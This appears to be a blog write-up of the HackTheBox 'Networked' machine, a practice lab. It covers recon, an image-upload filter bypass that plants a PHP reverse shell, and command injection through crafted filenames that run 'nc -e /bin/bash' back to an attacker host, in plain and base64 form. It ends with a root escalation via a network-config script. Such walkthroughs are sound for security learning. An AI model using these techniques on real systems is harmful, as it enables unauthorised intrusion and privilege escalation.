---
layout: post
title: Networked (10.10.10.146) Writeup
description: >
  Hackthebox Networked Writeup
image: /assets/img/networked.png
noindex: true
---

<center><h3>Summary</h3></center>
<br>

- Use a file upload to upload our reverse shell to the system
- Exploit a running cronjob that runs a php file every couple minutes
- Use a file that can be run as root to modify the contents of the <b>/etc/sysconfig/network-scripts/ifcfg-guly</b> to give us a reverse shell as root

First we start with an Nmap scan
```
# nmap -sV -sC -T4 -p- 10.10.10.146
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-20 11:24 EDT
Nmap scan report for 10.10.10.146
Host is up (0.060s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.49 seconds
```
Only a couple ports open. Lets check out port 80. Navigating to the webp age we don't see much.

![home.png](../../resources/8dfca00da31747308e81d05eb2d94a9a.png)

Running a <b>gobuster</b> will give us a few results.

```
# gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.146
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/20 11:36:02 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
```
So there are a few directories. If we going to the <b>/uploads.php</b> page we will be greeted with a file upload

![fileupload.png](../../resources/b10996682c8b47eeb7843916b71bc690.png)

Trying to upload a php reverse shell will get us and <b>invalid image file</b> message. We are going to have to sneak the shell onto the system. To do this we can append <b>GIF89a</b> to the top of the file and all change the extension from <b>.php</b> to <b>.php.jpeg</b>

```
GIF89a                                                                                                 
<?php                                                                                                  
// php-reverse-shell - A Reverse Shell implementation in PHP
```
Upload the file and you should be greeted with a message saying the upload was successful

![successful.png](../../resources/96819a53514141ecb8db1e0db57ec73e.png)

If you navigate to <b>http://10.10.10.146/photos.php</b> then you should see our uploaded file. Now before we trigger the shell we need to set up our <b>nc</b> listener.

![photos.png](../../resources/6ca33925e1854a7eb30e4cf5d7513462.png)

To trigger the shell navigate to <b>https://10.10.10.146/uploads/{name of file}</b>. If done correctly you should see a shell open

```
# nc -lvnp 10000
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::10000
Ncat: Listening on 0.0.0.0:10000
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:39074.
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:49:42 up 25 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$
```
If we do a quick <b>whoami</b> it shows that we have a low privileged shell as the user <b>apache</b>. If we navigate to <b>/home/user/guly</b> then we can see the user.txt file but we are unable to read it. There are also a couple of other interesting files in the home directory
```
sh-4.2$ whoami
whoami
apache

sh-4.2$ ls /home/guly
ls /home/guly
check_attack.php
crontab.guly
user.txt
```
Reading the <b>crontab.guly</b> and the <b>check_attack.php</b> file there are a few things we should note. The <b>crontab.guly</b> is telling us that there is a cronjob running every 3 minutes that executes <b>check_attack.php</b>. The <b>check_attack.php</b> file basically reads every file in the <b>/var/www/html/uploads</b> directory and then deletes it.
```
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php

bash-4.2$ cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
What we can exploit in this code is the <b>exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");</b>. Since it reads every file in the directory as a parameter then we can create a file that has the name of a command and instead of deleting the file it will run the command for us. There are two ways we can name the file. One is using base64 encoding and another is using the <b>$SHELL</b> variable as a reference to <b>/bin/sh</b>

<b>Base64</b>
```
# echo "nc -e /bin/bash 10.10.14.21 10001" | base64
bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LDIxIDEwMDAxCg==

bash-4.2$ touch test\;base64\ -d\ \<\<\<\ bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LDIxIDEwMDAxCg\=\=\ \|\ sh\;
```
<b>$SHELL</b>
```
bash-4.2$ touch test\;nc\ \-e\ \$SHELL\ 10.10.14.21\ 10001\ \|\ sh\;
```
After a few minutes you should see a shell open up. If we run <b>whoami</b> you will see that we are now the user <b>guly</b>
```
# nc -lvnp 10001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::10001
Ncat: Listening on 0.0.0.0:10001
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:52116.

whoami
guly
```
From here you can grab the user flag. Now onto root. If you type <b>sudo -l</b>, it turns out we have <b>sudo</b> rights to run the script <b>/usr/local/sbin/changename.sh</b>
```
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```
Running the script shows that it just asks us for a bunch of input.
```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
Now lets take a look at the actual file.
```
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```
Reading the script there is something that stands out. It writes the input that you give to the script to <b>/etc/sysconfig/network-scripts/ifcfg-guly</b>. Doing a quick google search on how this can be exploited reveals *[this](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)*.

After reading that article you should have a pretty good idea of what to do
```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
Network /bin/bash
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
[root@networked network-scripts]# whoami
root
```
Now that we are root we can read the <b>root.txt</b> file.
<br><br><br><br>
